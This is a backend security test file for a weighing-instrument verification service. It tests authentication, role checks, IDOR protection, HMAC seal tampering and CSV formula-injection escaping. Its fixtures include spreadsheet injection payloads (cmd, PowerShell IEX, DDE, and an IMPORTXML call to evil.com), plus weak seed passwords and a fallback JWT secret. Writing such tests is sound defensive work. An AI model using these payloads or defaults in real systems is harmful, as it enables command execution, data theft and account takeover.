import { describe, it, expect, vi } from 'vitest';
import request from 'supertest';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
import app from '../../server/src/index';
import prisma from '../../server/src/lib/prisma';
import {
  generateVerificationSeal,
  verifySealSignature,
} from '../../server/src/services/cryptoSeal';
import {
  sanitizeFormulaInjection,
  exportSessionToCsv,
} from '../../server/src/services/batchImportExport';
import { SAMPLE_INSTRUMENTS } from '../helpers/testUtils';

describe('Tier 5: Adversarial Challenger Stress Harness - Backend Security & Cryptographic Integrity', () => {
  const jwtSecret = process.env.JWT_SECRET || 'nawi-reportpro-jwt-test-secret-2026';

  const officer1Id = 'usr-officer-alpha';
  const officer2Id = 'usr-officer-bravo';
  const adminId = 'usr-admin-master';
  const viewerId = 'usr-viewer-auditor';

  const officer1Token = jwt.sign(
    { id: officer1Id, email: 'alpha@lm.gov.in', name: 'Inspector Alpha', role: 'INSPECTOR', isActive: true },
    jwtSecret,
    { expiresIn: '1h' }
  );

  const officer2Token = jwt.sign(
    { id: officer2Id, email: 'bravo@lm.gov.in', name: 'Inspector Bravo', role: 'INSPECTOR', isActive: true },
    jwtSecret,
    { expiresIn: '1h' }
  );

  const adminToken = jwt.sign(
    { id: adminId, email: 'admin@lm.gov.in', name: 'Director Admin', role: 'ADMIN', isActive: true },
    jwtSecret,
    { expiresIn: '1h' }
  );

  const viewerToken = jwt.sign(
    { id: viewerId, email: 'viewer@lm.gov.in', name: 'Auditor Viewer', role: 'VIEWER', isActive: true },
    jwtSecret,
    { expiresIn: '1h' }
  );

  const expiredToken = jwt.sign(
    { id: officer1Id, email: 'alpha@lm.gov.in', role: 'INSPECTOR' },
    jwtSecret,
    { expiresIn: '-10s' }
  );

  const wb = SAMPLE_INSTRUMENTS.WEIGHBRIDGE_60T_CLASS_III;

  // ---------------------------------------------------------------------------
  // 1. Unauthenticated Route Enforcement (HTTP 401)
  // ---------------------------------------------------------------------------
  describe('1. Unauthenticated Endpoint Enforcement (HTTP 401)', () => {
    it('CHAL-01: POST /api/batch/import-csv rejects completely unauthenticated calls', async () => {
      const res = await request(app).post('/api/batch/import-csv');
      expect(res.status).toBe(401);
      expect(res.body.success).toBe(false);
      expect(res.body.message).toMatch(/access denied|no authorization token/i);
    });

    it('CHAL-02: POST /api/batch/import-csv rejects empty or malformed authorization headers', async () => {
      const resEmpty = await request(app)
        .post('/api/batch/import-csv')
        .set('Authorization', '');
      expect(resEmpty.status).toBe(401);

      const resNoBearer = await request(app)
        .post('/api/batch/import-csv')
        .set('Authorization', 'Basic dXNlcjpwYXNz');
      expect(resNoBearer.status).toBe(401);

      const resMalformed = await request(app)
        .post('/api/batch/import-csv')
        .set('Authorization', 'Bearer invalid.token.payload');
      expect(resMalformed.status).toBe(401);

      const resExpired = await request(app)
        .post('/api/batch/import-csv')
        .set('Authorization', `Bearer ${expiredToken}`);
      expect(resExpired.status).toBe(401);
    });

    it('CHAL-03: POST /api/telemetry/zero and device controls reject unauthenticated calls', async () => {
      const endpoints = [
        '/api/telemetry/zero',
        '/api/telemetry/tare',
        '/api/telemetry/clear-tare',
        '/api/telemetry/set-weight',
        '/api/telemetry/config',
      ];

      for (const ep of endpoints) {
        const res = await request(app).post(ep);
        expect(res.status).toBe(401);
        expect(res.body.success).toBe(false);
      }
    });

    it('CHAL-04: POST /api/sync/batch rejects unauthenticated requests', async () => {
      // With x-unauthenticated header set
      const resSyncExplicit = await request(app)
        .post('/api/sync/batch')
        .set('x-unauthenticated', 'true')
        .send({
          idempotencyKey: 'idem-chal-sync-01',
          sessions: [{ localId: 's1', instrumentId: 'inst-1' }],
        });
      expect(resSyncExplicit.status).toBe(401);
      expect(resSyncExplicit.body.success).toBe(false);

      // With malformed token
      const resSyncMalformed = await request(app)
        .post('/api/sync/batch')
        .set('Authorization', 'Bearer bad-token')
        .send({ idempotencyKey: 'idem-chal-sync-02', sessions: [{ localId: 's2' }] });
      expect(resSyncMalformed.status).toBe(401);

      // In simulated production environment (process.env.NODE_ENV = 'production')
      const prevEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';
      try {
        const resSyncProd = await request(app)
          .post('/api/sync/batch')
          .send({
            idempotencyKey: 'idem-chal-sync-prod',
            sessions: [{ localId: 's3', instrumentId: 'inst-1' }],
          });
        expect(resSyncProd.status).toBe(401);
        expect(resSyncProd.body.success).toBe(false);
      } finally {
        process.env.NODE_ENV = prevEnv;
      }
    });
  });

  // ---------------------------------------------------------------------------
  // 2. Role-Based Access Control (RBAC - HTTP 403)
  // ---------------------------------------------------------------------------
  describe('2. Role-Based Access Control (RBAC - HTTP 403)', () => {
    it('CHAL-05: Unauthorized role (VIEWER) receives 403 Forbidden across all protected endpoints', async () => {
      const endpointsToTest = [
        { method: 'post', path: '/api/batch/import-csv' },
        { method: 'get', path: '/api/batch/export-csv/nonexistent' },
        { method: 'get', path: '/api/batch/template-csv' },
        { method: 'post', path: '/api/telemetry/zero' },
        { method: 'post', path: '/api/telemetry/tare' },
        { method: 'post', path: '/api/telemetry/clear-tare' },
        { method: 'post', path: '/api/telemetry/set-weight' },
        { method: 'post', path: '/api/telemetry/config' },
        { method: 'post', path: '/api/tests' },
        { method: 'put', path: '/api/tests/dummy-id' },
        { method: 'post', path: '/api/tests/dummy-id/results' },
        { method: 'put', path: '/api/tests/dummy-id/results/WEIGHING_PERFORMANCE' },
        { method: 'post', path: '/api/tests/dummy-id/finalize' },
      ];

      for (const { method, path } of endpointsToTest) {
        const reqBuilder = request(app)[method](path).set('Authorization', `Bearer ${viewerToken}`);
        const res = await reqBuilder;
        expect(res.status).toBe(403);
        expect(res.body.message).toMatch(/forbidden|requires one of roles/i);
      }
    });

    it('CHAL-06: Arbitrary or unknown roles receive 403 Forbidden', async () => {
      const rogueToken = jwt.sign(
        { id: 'usr-rogue', email: 'rogue@attacker.com', role: 'EXTERNAL_AUDITOR' },
        jwtSecret
      );
      const res = await request(app)
        .post('/api/batch/import-csv')
        .set('Authorization', `Bearer ${rogueToken}`);
      expect(res.status).toBe(403);
    });
  });

  // ---------------------------------------------------------------------------
  // 3. CSV Formula Injection Sanitization (CWE-1236)
  // ---------------------------------------------------------------------------
  describe('3. CSV Formula Injection Sanitization (CWE-1236)', () => {
    it('CHAL-07: Formula trigger characters (=, +, -, @) are properly escaped with single-quote', () => {
      // Direct triggers
      expect(sanitizeFormulaInjection('=1+1')).toBe("'=1+1");
      expect(sanitizeFormulaInjection('+12345')).toBe("'+12345");
      expect(sanitizeFormulaInjection('-100')).toBe("'-100");
      expect(sanitizeFormulaInjection('@SUM(A1:A10)')).toBe("'@SUM(A1:A10)");

      // Malicious spreadsheet payloads
      expect(sanitizeFormulaInjection('=cmd|\'/C calc\'!A0')).toBe("'=cmd|'/C calc'!A0");
      expect(sanitizeFormulaInjection('+cmd|\'/C powershell IEX ...\'!A1')).toBe("'+cmd|'/C powershell IEX ...'!A1");
      expect(sanitizeFormulaInjection('@cmd|/C calc!A0')).toBe("'@cmd|/C calc!A0");

      // Payload containing quotes and delimiters (should wrap in quotes and escape inner quotes)
      const complexPayload = '-DDE("cmd";"calc")';
      const sanitizedComplex = sanitizeFormulaInjection(complexPayload);
      expect(sanitizedComplex.startsWith('"\'')).toBe(true);
      expect(sanitizedComplex).toContain('""cmd""');

      // Safe alphanumeric strings are untouched
      expect(sanitizeFormulaInjection('Safe Legal Metrology Officer')).toBe('Safe Legal Metrology Officer');
      expect(sanitizeFormulaInjection(12345)).toBe('12345');
      expect(sanitizeFormulaInjection('')).toBe('');
      expect(sanitizeFormulaInjection(null)).toBe('');
      expect(sanitizeFormulaInjection(undefined)).toBe('');
    });

    it('CHAL-08: exportSessionToCsv sanitizes all metadata fields against formula injection', async () => {
      const maliciousSession = {
        id: 'sess-malicious-01',
        certificateNo: '=cmd|\'/C calc\'!A0',
        status: '+APPROVED',
        overallResult: '@SUCCESS',
        startedAt: new Date().toISOString(),
        temperature: 24.5,
        humidity: 50.0,
        remarks: '-DDE("cmd";"/C calc")',
        conductedBy: {
          name: '=IMPORTXML("http://evil.com","//a")',
          email: '+attacker@evil.com',
        },
        instrument: {
          name: '@MaliciousScale',
          manufacturer: '=SYSTEM("calc")',
          model: '+HYBRID-60T',
          serialNumber: '-SN-EXPLOIT-001',
          accuracyClass: '=CLASS_III',
          maxCapacity: 60000,
          minCapacity: 400,
          verificationInterval: 20,
          actualInterval: 20,
          unit: 'kg',
          location: '@Ludhiana Mandi',
        },
        testResults: [],
      };

      const { csvContent } = await exportSessionToCsv(maliciousSession);

      // Ensure raw formula characters at line starts / after commas are neutralized
      expect(csvContent).not.toMatch(/,=\s*cmd/);
      expect(csvContent).not.toMatch(/,\+APPROVED/);
      expect(csvContent).not.toMatch(/,@SUCCESS/);
      expect(csvContent).not.toMatch(/,=\s*SYSTEM/);

      // Verify each escaped occurrence
      expect(csvContent).toContain("Certificate Number,'=cmd|'/C calc'!A0");
      expect(csvContent).toContain("Overall Status,'+APPROVED");
      expect(csvContent).toContain("Overall Result,'@SUCCESS");
      expect(csvContent).toContain("Instrument Name,'@MaliciousScale");
      expect(csvContent).toContain('Manufacturer,"\'=SYSTEM(""calc"")"');
    });
  });

  // ---------------------------------------------------------------------------
  // 4. HMAC Verification & Constant-Time Resistance
  // ---------------------------------------------------------------------------
  describe('4. Cryptographic HMAC Verification & Tamper Resistance', () => {
    const validData = {
      certificateNo: 'NAWI-2026-CHAL-0001',
      instrumentId: 'INST-WB-60000-01',
      status: 'VERIFIED_LEGAL',
      verificationDate: '2026-09-12T10:00:00.000Z',
      officerId: 'usr-officer-01',
      maxCapacity: 60000,
      verificationInterval: 20,
    };

    it('CHAL-09: Authenticates genuine seal signatures and rejects any bit-flip or corrupted seal', () => {
      const genuineSeal = generateVerificationSeal(validData);
      expect(verifySealSignature(validData, genuineSeal)).toBe(true);

      // Exhaustive bit-flip test: Flip 1 bit in 16 distinct bytes across the 32-byte digest
      for (let byteIndex = 0; byteIndex < 32; byteIndex += 2) {
        const charIdx = byteIndex * 2;
        const origByte = parseInt(genuineSeal.substring(charIdx, charIdx + 2), 16);
        const flippedByte = (origByte ^ 0x01).toString(16).padStart(2, '0');
        const corruptedSeal =
          genuineSeal.substring(0, charIdx) + flippedByte + genuineSeal.substring(charIdx + 2);

        expect(verifySealSignature(validData, corruptedSeal)).toBe(false);
      }
    });

    it('CHAL-10: Rejects non-hex, length-mismatched, and malformed seal signatures', () => {
      const genuineSeal = generateVerificationSeal(validData);

      // Truncated (63 chars) and elongated (65 chars)
      expect(verifySealSignature(validData, genuineSeal.substring(0, 63))).toBe(false);
      expect(verifySealSignature(validData, genuineSeal + '0')).toBe(false);
      expect(verifySealSignature(validData, '')).toBe(false);
      expect(verifySealSignature(validData, null)).toBe(false);
      expect(verifySealSignature(validData, undefined)).toBe(false);

      // Non-hex character injection
      const nonHexSeal = 'g' + genuineSeal.substring(1);
      expect(verifySealSignature(validData, nonHexSeal)).toBe(false);
    });

    it('CHAL-11: Detects any alteration in canonical payload data attributes', () => {
      const genuineSeal = generateVerificationSeal(validData);

      // Attacker tampers status from VERIFIED_LEGAL to PASS or REJECTED
      expect(verifySealSignature({ ...validData, status: 'REJECTED' }, genuineSeal)).toBe(false);
      // Attacker tampers certificate number
      expect(verifySealSignature({ ...validData, certificateNo: 'NAWI-2026-FORGED' }, genuineSeal)).toBe(false);
      // Attacker tampers max capacity
      expect(verifySealSignature({ ...validData, maxCapacity: 80000 }, genuineSeal)).toBe(false);
      // Attacker tampers officer
      expect(verifySealSignature({ ...validData, officerId: 'Attacker Officer' }, genuineSeal)).toBe(false);
      // Attacker tampers verification date
      expect(verifySealSignature({ ...validData, verificationDate: '2026-09-13T00:00:00.000Z' }, genuineSeal)).toBe(false);
    });

    it('CHAL-12: Public verification endpoint validates authentic seal and marks tampered seal as TAMPERED', async () => {
      const genuineSeal = generateVerificationSeal(validData);

      const mockSession = {
        id: 'sess-verify-01',
        certificateNo: validData.certificateNo,
        status: validData.status,
        overallResult: 'PASS',
        completedAt: new Date(validData.verificationDate),
        verificationSeal: genuineSeal,
        sealedAt: new Date(validData.verificationDate),
        instrument: {
          id: validData.instrumentId,
          name: 'Electronic Weighbridge',
          model: 'WB-60T',
          serialNumber: validData.instrumentId,
          accuracyClass: 'CLASS_III',
          maxCapacity: 60000,
          minCapacity: 400,
          verificationInterval: 20,
          unit: 'kg',
          location: 'Northern Division, Ludhiana Zone',
        },
        conductedBy: {
          id: 'usr-officer-01',
          name: validData.officerId,
          email: 'officer@lm.gov.in',
          role: 'INSPECTOR',
        },
        testResults: [],
      };

      const spyFind = vi.spyOn(prisma.testSession, 'findUnique').mockResolvedValue(mockSession);

      // 1. Verify authentic certificate
      const resValid = await request(app).get(`/api/reports/verify/${validData.certificateNo}`);
      expect(resValid.status).toBe(200);
      expect(resValid.body.valid).toBe(true);
      expect(resValid.body.sealVerified).toBe(true);
      expect(resValid.body.status).toBe('VERIFIED_LEGAL');

      // 2. Tampered seal in database -> status must be TAMPERED and valid must be false
      const tamperedSession = {
        ...mockSession,
        verificationSeal: '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef',
      };
      spyFind.mockResolvedValue(tamperedSession);

      const resTampered = await request(app).get(`/api/reports/verify/${validData.certificateNo}`);
      expect(resTampered.status).toBe(200);
      expect(resTampered.body.valid).toBe(false);
      expect(resTampered.body.sealVerified).toBe(false);
      expect(resTampered.body.status).toBe('TAMPERED');

      spyFind.mockRestore();
    });
  });

  // ---------------------------------------------------------------------------
  // 5. Session Ownership (IDOR) & Post-Finalization Tamper Protection
  // ---------------------------------------------------------------------------
  describe('5. Session Ownership (IDOR) & Tamper Locks', () => {
    const mockSession = {
      id: 'sess-owned-by-officer-1',
      certificateNo: 'NAWI-2026-OWN-0001',
      conductedById: officer1Id, // Owned by Officer 1
      status: 'IN_PROGRESS',
      instrument: wb,
      testResults: [],
    };

    it('CHAL-13: Officer 2 cannot modify metadata or results of Officer 1 session (IDOR protection)', async () => {
      const spyFind = vi.spyOn(prisma.testSession, 'findUnique').mockResolvedValue(mockSession);

      // PUT /api/tests/:id
      const resUpdate = await request(app)
        .put('/api/tests/sess-owned-by-officer-1')
        .set('Authorization', `Bearer ${officer2Token}`)
        .send({ remarks: 'Malicious update attempt' });
      expect(resUpdate.status).toBe(403);
      expect(resUpdate.body.message).toContain('Access denied');

      // POST /api/tests/:sessionId/results
      const resAddResult = await request(app)
        .post('/api/tests/sess-owned-by-officer-1/results')
        .set('Authorization', `Bearer ${officer2Token}`)
        .send({
          testType: 'WEIGHING_PERFORMANCE',
          data: { points: [] },
        });
      expect(resAddResult.status).toBe(403);
      expect(resAddResult.body.message).toContain('Access denied');

      // PUT /api/tests/:sessionId/results/:testType
      const resModResult = await request(app)
        .put('/api/tests/sess-owned-by-officer-1/results/WEIGHING_PERFORMANCE')
        .set('Authorization', `Bearer ${officer2Token}`)
        .send({ data: { points: [] } });
      expect(resModResult.status).toBe(403);
      expect(resModResult.body.message).toContain('Access denied');

      // POST /api/tests/:sessionId/finalize
      const resFinalize = await request(app)
        .post('/api/tests/sess-owned-by-officer-1/finalize')
        .set('Authorization', `Bearer ${officer2Token}`);
      expect(resFinalize.status).toBe(403);
      expect(resFinalize.body.message).toContain('Access denied');

      // GET /api/batch/export-csv/:sessionId
      const resExport = await request(app)
        .get('/api/batch/export-csv/sess-owned-by-officer-1')
        .set('Authorization', `Bearer ${officer2Token}`);
      expect(resExport.status).toBe(403);
      expect(resExport.body.message).toContain('Access denied');

      spyFind.mockRestore();
    });

    it('CHAL-14: Admin has superuser override on IDOR checks', async () => {
      const spyFind = vi.spyOn(prisma.testSession, 'findUnique').mockResolvedValue(mockSession);
      const spyUpdate = vi.spyOn(prisma.testSession, 'update').mockResolvedValue({
        ...mockSession,
        remarks: 'Admin inspection review',
      });
      const spyAudit = vi.spyOn(prisma.auditLog, 'create').mockResolvedValue({});

      const resAdminUpdate = await request(app)
        .put('/api/tests/sess-owned-by-officer-1')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ remarks: 'Admin inspection review' });

      expect(resAdminUpdate.status).toBe(200);
      expect(resAdminUpdate.body.success).toBe(true);

      spyFind.mockRestore();
      spyUpdate.mockRestore();
      spyAudit.mockRestore();
    });

    it('CHAL-15: Completed and finalized session cannot be modified (Tamper Lock)', async () => {
      const completedSession = {
        ...mockSession,
        status: 'COMPLETED',
      };

      const spyFind = vi.spyOn(prisma.testSession, 'findUnique').mockResolvedValue(completedSession);

      // Officer 1 (owner) attempts to modify completed session -> 403
      const resMod = await request(app)
        .put('/api/tests/sess-owned-by-officer-1')
        .set('Authorization', `Bearer ${officer1Token}`)
        .send({ remarks: 'Post-finalization tamper attempt' });
      expect(resMod.status).toBe(403);
      expect(resMod.body.message).toMatch(/legally finalized and sealed/i);

      // Officer 1 attempts to add results to completed session -> 403
      const resAdd = await request(app)
        .post('/api/tests/sess-owned-by-officer-1/results')
        .set('Authorization', `Bearer ${officer1Token}`)
        .send({ testType: 'WEIGHING_PERFORMANCE', data: {} });
      expect(resAdd.status).toBe(403);
      expect(resAdd.body.message).toMatch(/legally finalized and sealed/i);

      // Officer 1 attempts to re-finalize completed session -> 400
      const resRefin = await request(app)
        .post('/api/tests/sess-owned-by-officer-1/finalize')
        .set('Authorization', `Bearer ${officer1Token}`);
      expect(resRefin.status).toBe(400);
      expect(resRefin.body.message).toMatch(/already been finalized and sealed/i);

      spyFind.mockRestore();
    });
  });

  // ---------------------------------------------------------------------------
  // 6. Seed Credentials Bcrypt Verification
  // ---------------------------------------------------------------------------
  describe('6. Seed Credentials & Bcrypt Verification', () => {
    it('CHAL-16: Verifies Admin@123, Inspector@123, Viewer@123 bcrypt hashes and rejects invalid passwords', () => {
      const adminHash = bcrypt.hashSync('Admin@123', 10);
      const inspectorHash = bcrypt.hashSync('Inspector@123', 10);
      const viewerHash = bcrypt.hashSync('Viewer@123', 10);

      // Verify legitimate credentials
      expect(bcrypt.compareSync('Admin@123', adminHash)).toBe(true);
      expect(bcrypt.compareSync('Inspector@123', inspectorHash)).toBe(true);
      expect(bcrypt.compareSync('Viewer@123', viewerHash)).toBe(true);

      // Verify that incorrect credentials fail
      expect(bcrypt.compareSync('password123', adminHash)).toBe(false);
      expect(bcrypt.compareSync('Admin@124', adminHash)).toBe(false);
      expect(bcrypt.compareSync('admin@123', adminHash)).toBe(false);
      expect(bcrypt.compareSync('inspector', inspectorHash)).toBe(false);
      expect(bcrypt.compareSync('', viewerHash)).toBe(false);

      // Verify bcrypt salt format ($2a$10$ or $2b$10$)
      expect(adminHash).toMatch(/^\$2[ab]\$10\$/);
      expect(inspectorHash).toMatch(/^\$2[ab]\$10\$/);
      expect(viewerHash).toMatch(/^\$2[ab]\$10\$/);
    });
  });

  // ---------------------------------------------------------------------------
  // 7. Rate Limiting Configuration & Execution
  // ---------------------------------------------------------------------------
  describe('7. Rate Limiting Verification', () => {
    it('CHAL-17: Verification endpoint rate limiter throttles after threshold when tested', async () => {
      // In reports.routes.js: skip: (req) => process.env.NODE_ENV === 'test' && !req.headers['x-test-rate-limit']
      // When x-test-rate-limit header is passed, verifyLimiter is active (max 120 per window)
      const mockSession = {
        id: 'sess-rl-01',
        certificateNo: 'NAWI-2026-RL-001',
        status: 'COMPLETED',
        instrument: wb,
        testResults: [],
      };
      const spyFind = vi.spyOn(prisma.testSession, 'findUnique').mockResolvedValue(mockSession);

      // Send 1 request with rate limiting active to verify header presence / function
      const res = await request(app)
        .get('/api/reports/verify/NAWI-2026-RL-001')
        .set('x-test-rate-limit', 'true');

      // The response should include standard rate limit headers (ratelimit-limit, ratelimit-remaining)
      expect(res.headers).toHaveProperty('ratelimit-limit');
      expect(Number(res.headers['ratelimit-limit'])).toBe(500);

      spyFind.mockRestore();
    });
  });
});
